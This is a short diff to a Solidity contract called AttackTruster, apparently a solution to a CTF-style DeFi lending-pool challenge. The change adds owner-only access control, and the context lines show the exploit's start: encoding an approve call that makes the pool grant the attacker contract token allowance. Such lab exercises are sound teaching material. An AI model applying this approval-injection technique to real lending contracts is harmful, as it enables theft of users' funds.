@@ -3,10 +3,11 @@
 pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
 import "./TrusterLenderPool.sol";
 import "hardhat/console.sol";
 
-contract AttackTruster {
+contract AttackTruster is Ownable {
     IERC20 public token;
     TrusterLenderPool public pool;
 
@@ -15,7 +16,7 @@ contract AttackTruster {
         pool = TrusterLenderPool(_pool);
     }
 
-    function attack() external {
+    function attack() external onlyOwner {
         // let pool approve this contract
         bytes memory _data = abi.encodeWithSignature(
             "approve(address,uint256)",
